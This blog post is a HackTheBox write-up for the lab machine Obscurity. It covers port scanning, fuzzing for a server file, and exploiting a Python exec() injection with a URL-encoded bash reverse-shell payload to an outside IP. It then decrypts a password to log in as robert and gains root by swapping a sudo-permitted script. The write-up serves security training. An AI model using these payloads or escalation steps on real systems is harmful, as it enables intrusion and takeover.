---
layout: post
title: HackTheBox Obscurity (10.10.10.168) Writeup
description: >
  Hackthebox Obscurity Writeup
image: /assets/img/obscurity.png
noindex: false
---

**NMAP:**
```
# Nmap 7.80 scan initiated Fri May  8 23:17:40 2020 as: nmap -sC -sV -T4 -p- -oN fullNmap.txt
10.10.10.168
Nmap scan report for 10.10.10.168
Host is up (0.022s latency).
Not shown: 65531 filtered ports
PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 33:d3:9a:0d:97:2c:54:20:e1:b0:17:34:f4:ca:70:1b (RSA)
|   256 f6:8b:d5:73:97:be:52:cb:12:ea:8b:02:7c:34:a3:d7 (ECDSA)
|_  256 e8:df:55:78:76:85:4b:7b:dc:70:6a:fc:40:cc:ac:9b (ED25519)
80/tcp   closed http
8080/tcp open   http-proxy BadHTTPServer
| fingerprint-strings:
|   GetRequest, HTTPOptions:
|     HTTP/1.1 200 OK
|     Date: Fri, 08 May 2020 23:20:23
|     Server: BadHTTPServer
|     Last-Modified: Fri, 08 May 2020 23:20:23
|     Content-Length: 4171
|     Content-Type: text/html
|     Connection: Closed
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>0bscura</title>
|     <meta http-equiv="X-UA-Compatible" content="IE=Edge">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta name="keywords" content="">
|     <meta name="description" content="">
|     <!--
|     Easy Profile Template
|     http://www.templatemo.com/tm-467-easy-profile
|     <!-- stylesheet css -->
|     <link rel="stylesheet" href="css/bootstrap.min.css">
|     <link rel="stylesheet" href="css/font-awesome.min.css">
|     <link rel="stylesheet" href="css/templatemo-blue.css">
|     </head>
|     <body data-spy="scroll" data-target=".navbar-collapse">
|     <!-- preloader section -->
|     <!--
|     <div class="preloader">
|_    <div class="sk-spinner sk-spinner-wordpress">
|_http-server-header: BadHTTPServer
|_http-title: 0bscura
9000/tcp closed cslistener
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri May  8 23:19:18 2020 -- 1 IP address (1 host up) scanned in 98.25 seconds
```
Looking at the webpage on port 8080 I see that it mentions a file `SuperSecureServer.py`. I use ffuf to fuzz for the file.
```
 ./ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.10.168:8080/FUZZ/SuperSecureServer.py

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.1.0-git
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.168:8080/FUZZ/SuperSecureServer.py
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

develop                 [Status: 200, Size: 5892, Words: 1806, Lines: 171]
```
Navigating to `http://10.10.10.168:8080/develop/SuperSecureServer.py` I find the python file. Towards the bottom of the file there are these two lines 
```
 info = "output = 'Document: {}'" # Keep the output for later debug
 exec(info.format(path)) # This is how you do string formatting, right?
 ```
 The exec function is being used which can be exploited to execute a reverse shell. By sending a GET request to something like `https://10.10.10.168/rev';os.system("bash -c \'bash -i >& /dev/tcp/10.10.14.36/9999 0>&1\'");'` I can get a reverse shell. The only thing I had to do first was URL encode the the shell portion.
 ```
 root@pc1:~# curl http://10.10.10.168:8080/test%27%3Bos.system%28%22bash%20-c%20%5C%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.36%2F9999%200%3E%261%5C%27%22%29%3B%27
 ```
 With that I now have a shell as `www-data`. the `user.txt` file is located in `/home/robert` but I dont have permission to read it just yet. There are some other files in robert's home directory though.
 ```
 www-data@obscure:/home/robert$ ls
BetterSSH  out.txt               SuperSecureCrypt.py
check.txt  passwordreminder.txt  user.txt
```
Looking at each, `SuperSecureCrypt.py` looks like an encryption/decryption script, `out.txt` is the encrypted output of `check.txt` and `passwordreminder.txt` is another encrypted file which most likely contains a some kind of password. The key that was used for encrypting `check.txt` can be found with the following command
```
python3 SuperSecureCrypt.py -k "$(cat check.txt)" -i out.txt -o /tmp/key.txt -d
 ```
 With that I get a key of `alexandrovich`. I use that key to decrypt the contents of `passwordreminder.txt` and get `SecThruObsFTW`. Now with the credentials `robert;SecThruObsFTW` I can log in as robert and read the `user.txt` flag.
 ```
 robert@obscure:~$ cat user.txt
e4493782066b55fe2755708736ada2d7
```
Typing `sudo -l` to see if I can execute anything with sudo permissions gives me one option
```
Matching Defaults entries for robert on obscure:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User robert may run the following commands on obscure:
    (ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
```
Lucky for me BetterSSH is located in roberts home directory. Even though the file is owned by root and I cant modify it, I can modify the directory because of the way linux permissions work even if the directory is owned by root. So my privilege escalation will work like this. First rename the BetterSSH directory to a new name. Then create a new BetterSSH directory with a new `BetterSSH.py` file that executes a bash shell. Since I can execute the command as root it will give me a root shell.
```
robert@obscure:~$ mv BetterSSH/ BetterSSH2
robert@obscure:~$ mkdir BetterSSH
robert@obscure:~$ touch BetterSSH/BetterSSH.py
robert@obscure:~$ vim BetterSSH/BetterSSH.py
robert@obscure:~$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
root@obscure:~# whoami
root
```
From here I can read the `root.txt` file.
```
root@obscure:/root# cat root.txt
512fd4429f33a113a44d5acde23609e3
```
